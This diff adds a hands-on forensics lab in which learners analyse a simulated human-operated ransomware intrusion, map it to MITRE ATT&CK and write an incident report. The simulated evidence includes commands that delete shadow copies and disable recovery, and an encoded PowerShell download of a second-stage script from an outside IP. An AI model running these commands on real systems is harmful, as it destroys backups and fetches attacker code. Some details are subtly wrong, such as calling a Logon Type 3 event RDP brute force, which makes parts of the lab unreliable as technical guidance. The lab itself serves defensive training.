@@ -1,0 +1,466 @@
+Analyze Intrusion Case Study: Human-Operated Ransomware
+Learning Objectives
+By completing this lab, you will:
+
+Identify common attack vectors used in human-operated ransomware campaigns
+Map attack techniques to the MITRE ATT&CK framework
+Perform forensic analysis of ransomware attack artifacts
+Understand the progression of a sophisticated ransomware attack
+Prerequisites
+Basic understanding of Linux command line
+Familiarity with network protocols and log analysis
+Knowledge of cybersecurity fundamentals
+Understanding of file systems and process analysis
+Lab Environment
+Al Nafi provides Linux-based cloud machines for this lab. Simply click Start Lab to access your dedicated environment. The provided Linux machine is bare metal with no pre-installed tools, so you will install all required tools during the lab exercises.
+
+Task 1: Identify Attack Vectors Used in Ransomware
+Subtask 1.1: Install Required Tools
+Install forensic analysis and network tools:
+
+sudo apt update && sudo apt install -y \
+    wireshark-common \
+    tcpdump \
+    volatility3 \
+    sleuthkit \
+    autopsy \
+    binwalk \
+    hexdump \
+    strings \
+    file \
+    python3-pip \
+    git \
+    curl \
+    wget
+
+pip3 install --user yara-python requests
+Subtask 1.2: Create Simulated Attack Artifacts
+Generate sample log files and network captures representing a ransomware attack:
+
+mkdir -p ~/ransomware_case/{logs,network,malware,timeline}
+cd ~/ransomware_case
+
+# Create simulated Windows event logs
+cat > logs/security.log << 'EOF'
+2024-01-15 08:30:15 EventID:4624 Logon Type:3 Account:admin Source:192.168.1.100
+2024-01-15 08:31:22 EventID:4648 Explicit credential use Account:admin Target:DC01
+2024-01-15 08:32:45 EventID:4672 Special privileges assigned Account:admin
+2024-01-15 08:35:10 EventID:4688 Process created: powershell.exe -enc <base64>
+2024-01-15 08:36:30 EventID:4688 Process created: wmic.exe shadowcopy delete /nointeractive
+2024-01-15 08:37:15 EventID:4688 Process created: vssadmin.exe delete shadows /all /quiet
+2024-01-15 08:40:00 EventID:4688 Process created: bcdedit.exe /set recoveryenabled no
+2024-01-15 09:15:30 EventID:4688 Process created: encrypt.exe C:\Users\
+EOF
+
+# Create network connection logs
+cat > logs/network.log << 'EOF'
+2024-01-15 08:29:45 TCP 192.168.1.100:445 -> 192.168.1.50:52341 SMB
+2024-01-15 08:30:12 TCP 192.168.1.100:135 -> 192.168.1.50:52342 RPC
+2024-01-15 08:31:00 TCP 192.168.1.50:443 -> 185.220.101.45:443 HTTPS
+2024-01-15 08:32:15 DNS 192.168.1.50 -> tor-relay.darkweb.onion
+2024-01-15 08:45:30 TCP 192.168.1.50:8080 -> 45.142.214.123:8080 HTTP
+EOF
+
+# Create file system timeline
+cat > timeline/filesystem.csv << 'EOF'
+Date,Time,Size,Activity,Path
+2024-01-15,08:30:00,2048,Created,C:\temp\stage1.exe
+2024-01-15,08:31:15,4096,Modified,C:\Windows\System32\drivers\etc\hosts
+2024-01-15,08:35:00,8192,Created,C:\temp\lateral.ps1
+2024-01-15,08:40:00,0,Deleted,C:\Windows\System32\config\SAM.bak
+2024-01-15,09:00:00,1024,Created,C:\Users\admin\Desktop\README.txt
+2024-01-15,09:15:00,16384,Created,C:\temp\encrypt.exe
+EOF
+Subtask 1.3: Analyze Initial Access Vectors
+Examine the logs to identify initial access methods:
+
+# Analyze authentication logs for suspicious logons
+echo "=== ANALYZING INITIAL ACCESS ==="
+grep -E "(EventID:4624|EventID:4625)" logs/security.log
+
+# Check for lateral movement indicators
+echo -e "\n=== LATERAL MOVEMENT ANALYSIS ==="
+grep -E "(EventID:4648|EventID:4672)" logs/security.log
+
+# Examine network connections for external communication
+echo -e "\n=== EXTERNAL COMMUNICATIONS ==="
+grep -E "(HTTPS|DNS)" logs/network.log
+Subtask 1.4: Document Attack Vectors
+Create an attack vector analysis report:
+
+cat > attack_vectors_analysis.txt << 'EOF'
+RANSOMWARE ATTACK VECTOR ANALYSIS
+=================================
+
+1. INITIAL ACCESS:
+   - Remote Desktop Protocol (RDP) brute force
+   - Evidence: Logon Type 3 from external IP
+   - Timestamp: 2024-01-15 08:30:15
+
+2. CREDENTIAL ACCESS:
+   - Explicit credential use detected
+   - Privilege escalation to admin account
+   - Evidence: EventID 4648, 4672
+
+3. LATERAL MOVEMENT:
+   - SMB and RPC connections to internal hosts
+   - PowerShell execution with encoded commands
+   - WMI usage for remote execution
+
+4. COMMAND AND CONTROL:
+   - HTTPS connections to suspicious IPs
+   - Tor network communication
+   - DNS queries to .onion domains
+
+5. IMPACT:
+   - Shadow copy deletion (vssadmin, wmic)
+   - Boot configuration modification
+   - File encryption process execution
+EOF
+
+cat attack_vectors_analysis.txt
+Task 2: Map the Attack to MITRE ATT&CK
+Subtask 2.1: Install MITRE ATT&CK Tools
+Download and set up MITRE ATT&CK framework tools:
+
+# Clone MITRE ATT&CK data
+git clone https://github.com/mitre/cti.git ~/mitre-attack
+cd ~/ransomware_case
+
+# Create ATT&CK mapping script
+cat > mitre_mapping.py << 'EOF'
+#!/usr/bin/env python3
+import json
+import re
+
+# Define observed techniques and their evidence
+attack_mapping = {
+    "T1078": {
+        "name": "Valid Accounts",
+        "tactic": "Initial Access",
+        "evidence": "EventID:4624 Logon Type:3 Account:admin",
+        "description": "Adversary used valid admin credentials"
+    },
+    "T1021.001": {
+        "name": "Remote Desktop Protocol",
+        "tactic": "Lateral Movement",
+        "evidence": "Remote logon from external IP",
+        "description": "RDP used for initial access and lateral movement"
+    },
+    "T1059.001": {
+        "name": "PowerShell",
+        "tactic": "Execution",
+        "evidence": "powershell.exe -enc <base64>",
+        "description": "Encoded PowerShell commands executed"
+    },
+    "T1490": {
+        "name": "Inhibit System Recovery",
+        "tactic": "Impact",
+        "evidence": "vssadmin.exe delete shadows, bcdedit /set recoveryenabled no",
+        "description": "Deleted shadow copies and disabled recovery"
+    },
+    "T1486": {
+        "name": "Data Encrypted for Impact",
+        "tactic": "Impact",
+        "evidence": "encrypt.exe C:\\Users\\",
+        "description": "File encryption process executed"
+    },
+    "T1071.001": {
+        "name": "Web Protocols",
+        "tactic": "Command and Control",
+        "evidence": "HTTPS connections to 185.220.101.45",
+        "description": "C2 communication over HTTPS"
+    }
+}
+
+print("MITRE ATT&CK TECHNIQUE MAPPING")
+print("=" * 50)
+for technique_id, details in attack_mapping.items():
+    print(f"\nTechnique ID: {technique_id}")
+    print(f"Name: {details['name']}")
+    print(f"Tactic: {details['tactic']}")
+    print(f"Evidence: {details['evidence']}")
+    print(f"Description: {details['description']}")
+    print("-" * 30)
+EOF
+
+chmod +x mitre_mapping.py
+Subtask 2.2: Execute ATT&CK Mapping
+Run the mapping analysis:
+
+python3 mitre_mapping.py > mitre_attack_mapping.txt
+cat mitre_attack_mapping.txt
+Subtask 2.3: Create Attack Timeline
+Generate a chronological attack timeline:
+
+cat > attack_timeline.py << 'EOF'
+#!/usr/bin/env python3
+from datetime import datetime
+
+timeline_events = [
+    ("2024-01-15 08:30:15", "T1078", "Initial Access", "Admin account logon from external IP"),
+    ("2024-01-15 08:31:22", "T1078", "Credential Access", "Explicit credential use detected"),
+    ("2024-01-15 08:32:45", "T1078", "Privilege Escalation", "Special privileges assigned"),
+    ("2024-01-15 08:35:10", "T1059.001", "Execution", "PowerShell with encoded commands"),
+    ("2024-01-15 08:36:30", "T1490", "Impact", "Shadow copy deletion initiated"),
+    ("2024-01-15 08:37:15", "T1490", "Impact", "All shadow copies deleted"),
+    ("2024-01-15 08:40:00", "T1490", "Impact", "System recovery disabled"),
+    ("2024-01-15 09:15:30", "T1486", "Impact", "File encryption process started")
+]
+
+print("ATTACK TIMELINE WITH MITRE ATT&CK MAPPING")
+print("=" * 60)
+for timestamp, technique, tactic, description in timeline_events:
+    print(f"{timestamp} | {technique:10} | {tactic:15} | {description}")
+EOF
+
+python3 attack_timeline.py > attack_timeline.txt
+cat attack_timeline.txt
+Task 3: Perform Forensic Investigation of Attack Techniques
+Subtask 3.1: Analyze PowerShell Artifacts
+Create and analyze PowerShell execution artifacts:
+
+# Create sample PowerShell artifacts
+mkdir -p forensics/powershell
+cat > forensics/powershell/encoded_command.txt << 'EOF'
+SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvADEAOAA1AC4AMgAyADAALgAxADAAMQAuADQANQAvAHMAYwByAGkAcAB0AC4AcABzADEAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAQwA6AFwAdABlAG0AcABcAHMAdABhAGcAZQAyAC4AcABzADEAIgA=
+EOF
+
+# Decode base64 PowerShell command
+echo "=== DECODING POWERSHELL COMMAND ==="
+base64 -d forensics/powershell/encoded_command.txt
+echo -e "\n"
+
+# Create PowerShell history analysis
+cat > analyze_powershell.py << 'EOF'
+#!/usr/bin/env python3
+import base64
+import re
+
+def decode_powershell(encoded_cmd):
+    try:
+        decoded = base64.b64decode(encoded_cmd).decode('utf-16le')
+        return decoded
+    except:
+        return "Failed to decode"
+
+# Sample encoded command from logs
+encoded_cmd = "SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvADEAOAA1AC4AMgAyADAALgAxADAAMQAuADQANQAvAHMAYwByAGkAcAB0AC4AcABzADEAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAQwA6AFwAdABlAG0AcABcAHMAdABhAGcAZQAyAC4AcABzADEAIgA="
+
+decoded = decode_powershell(encoded_cmd)
+print("POWERSHELL FORENSIC ANALYSIS")
+print("=" * 40)
+print(f"Encoded Command: {encoded_cmd[:50]}...")
+print(f"Decoded Command: {decoded}")
+
+# Analyze the decoded command
+if "Invoke-WebRequest" in decoded:
+    print("\nTHREAT INDICATORS:")
+    print("- Downloads file from external server")
+    print("- Saves to C:\\temp\\ directory")
+    print("- Likely second-stage payload")
+    
+    # Extract IOCs
+    urls = re.findall(r'https?://[^\s"]+', decoded)
+    files = re.findall(r'C:\\[^\s"]+', decoded)
+    
+    print(f"\nIOCs EXTRACTED:")
+    print(f"URLs: {urls}")
+    print(f"File Paths: {files}")
+EOF
+
+python3 analyze_powershell.py
+Subtask 3.2: File System Forensics
+Analyze file system artifacts:
+
+# Create sample malware for analysis
+mkdir -p forensics/malware
+echo -e "MZ\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00\xff\xff\x00\x00" > forensics/malware/encrypt.exe
+echo "This is a simulated ransomware note" > forensics/malware/README.txt
+
+# Analyze file properties
+echo "=== FILE SYSTEM FORENSIC ANALYSIS ==="
+echo "File Analysis:"
+file forensics/malware/*
+
+echo -e "\nFile Hashes:"
+md5sum forensics/malware/* 2>/dev/null
+sha256sum forensics/malware/* 2>/dev/null
+
+echo -e "\nStrings Analysis:"
+strings forensics/malware/encrypt.exe 2>/dev/null | head -10
+
+# Timeline analysis
+echo -e "\n=== FILESYSTEM TIMELINE ANALYSIS ==="
+cat timeline/filesystem.csv | while IFS=',' read date time size activity path; do
+    if [[ "$date" != "Date" ]]; then
+        echo "$date $time - $activity: $path ($size bytes)"
+    fi
+done
+Subtask 3.3: Network Forensics
+Analyze network artifacts:
+
+# Create network forensics analysis
+cat > network_forensics.py << 'EOF'
+#!/usr/bin/env python3
+import re
+from collections import defaultdict
+
+def analyze_network_logs(log_file):
+    connections = defaultdict(list)
+    suspicious_ips = []
+    
+    with open(log_file, 'r') as f:
+        for line in f:
+            # Parse network log entries
+            if 'TCP' in line or 'DNS' in line or 'HTTPS' in line:
+                parts = line.strip().split()
+                timestamp = f"{parts[0]} {parts[1]}"
+                protocol = parts[2]
+                connection = parts[3]
+                
+                connections[protocol].append({
+                    'timestamp': timestamp,
+                    'connection': connection
+                })
+                
+                # Check for suspicious IPs (external/unknown)
+                if '185.220.101.45' in connection or 'tor-relay' in line:
+                    suspicious_ips.append(connection)
+    
+    return connections, suspicious_ips
+
+# Analyze network logs
+connections, suspicious = analyze_network_logs('logs/network.log')
+
+print("NETWORK FORENSIC ANALYSIS")
+print("=" * 40)
+
+for protocol, conn_list in connections.items():
+    print(f"\n{protocol} Connections:")
+    for conn in conn_list:
+        print(f"  {conn['timestamp']} - {conn['connection']}")
+
+print(f"\nSUSPICIOUS CONNECTIONS:")
+for susp in suspicious:
+    print(f"  {susp}")
+
+print(f"\nTHREAT ASSESSMENT:")
+print("- External C2 communication detected")
+print("- Tor network usage identified")
+print("- Potential data exfiltration channels")
+EOF
+
+python3 network_forensics.py
+Subtask 3.4: Generate Forensic Report
+Create a comprehensive forensic investigation report:
+
+cat > forensic_investigation_report.txt << 'EOF'
+RANSOMWARE FORENSIC INVESTIGATION REPORT
+=======================================
+
+CASE SUMMARY:
+Human-operated ransomware attack targeting corporate network
+Attack Date: January 15, 2024
+Investigation Date: $(date)
+
+ATTACK VECTOR ANALYSIS:
+1. Initial Access: RDP brute force attack
+2. Credential Compromise: Valid admin account
+3. Lateral Movement: SMB/RPC protocols
+4. Persistence: Privileged account access
+5. Command & Control: HTTPS and Tor communications
+6. Impact: Data encryption and system recovery inhibition
+
+MITRE ATT&CK MAPPING:
+- T1078: Valid Accounts (Initial Access)
+- T1021.001: Remote Desktop Protocol (Lateral Movement)
+- T1059.001: PowerShell (Execution)
+- T1071.001: Web Protocols (Command and Control)
+- T1490: Inhibit System Recovery (Impact)
+- T1486: Data Encrypted for Impact (Impact)
+
+KEY FORENSIC ARTIFACTS:
+1. PowerShell Execution:
+   - Encoded command execution detected
+   - Second-stage payload download
+   - File: C:\temp\stage2.ps1
+
+2. System Modifications:
+   - Shadow copy deletion (vssadmin, wmic)
+   - Boot recovery disabled (bcdedit)
+   - System backup files deleted
+
+3. Network Communications:
+   - C2 server: 185.220.101.45:443
+   - Tor relay communications
+   - Data exfiltration channels
+
+4. File System Impact:
+   - Encryption executable: C:\temp\encrypt.exe
+   - Ransom note: C:\Users\admin\Desktop\README.txt
+   - Staging directory: C:\temp\
+
+INDICATORS OF COMPROMISE (IOCs):
+- IP Addresses: 185.220.101.45, 45.142.214.123
+- File Hashes: [Generated during analysis]
+- Domain: tor-relay.darkweb.onion
+- File Paths: C:\temp\encrypt.exe, C:\temp\stage1.exe
+
+RECOMMENDATIONS:
+1. Implement RDP security controls
+2. Deploy endpoint detection and response (EDR)
+3. Monitor PowerShell execution
+4. Block identified IOCs
+5. Implement network segmentation
+6. Regular backup verification
+
+INVESTIGATION COMPLETED: $(date)
+EOF
+
+cat forensic_investigation_report.txt
+Verification and Summary
+Verify Lab Completion
+Check that all analysis files were created:
+
+echo "=== LAB COMPLETION VERIFICATION ==="
+echo "Files created:"
+ls -la ~/ransomware_case/
+echo -e "\nAnalysis outputs:"
+ls -la *.txt *.py
+echo -e "\nForensic artifacts:"
+ls -la forensics/*/
+Lab Summary
+Display final results:
+
+echo "=== LAB 6 COMPLETION SUMMARY ==="
+echo "1. Attack Vector Analysis: COMPLETED"
+echo "   - Identified RDP brute force initial access"
+echo "   - Documented lateral movement techniques"
+echo "   - Analyzed command and control methods"
+echo ""
+echo "2. MITRE ATT&CK Mapping: COMPLETED"
+echo "   - Mapped 6 attack techniques"
+echo "   - Created chronological timeline"
+echo "   - Documented tactics and procedures"
+echo ""
+echo "3. Forensic Investigation: COMPLETED"
+echo "   - Analyzed PowerShell artifacts"
+echo "   - Examined file system evidence"
+echo "   - Investigated network communications"
+echo "   - Generated comprehensive report"
+echo ""
+echo "Key Skills Demonstrated:"
+echo "- Ransomware attack analysis"
+echo "- MITRE ATT&CK framework application"
+echo "- Digital forensics techniques"
+echo "- Incident response procedures"
+Conclusion
+You have successfully completed a comprehensive analysis of a human-operated ransomware attack case study. This lab provided hands-on experience with:
+
+Attack Vector Identification: Analyzed multiple entry points and progression techniques used by ransomware operators
+MITRE ATT&CK Mapping: Applied the industry-standard framework to categorize and understand attack techniques
+Forensic Investigation: Performed detailed analysis of PowerShell artifacts, file system evidence, and network communications
+These skills are essential for cybersecurity professionals working in incident response, threat hunting, and digital forensics roles. Understanding ransomware attack patterns helps organizations better prepare defenses and respond effectively to similar threats.
+
+The techniques learned in this lab directly apply to real-world ransomware investigations and provide a foundation for advanced threat analysis capabilities.
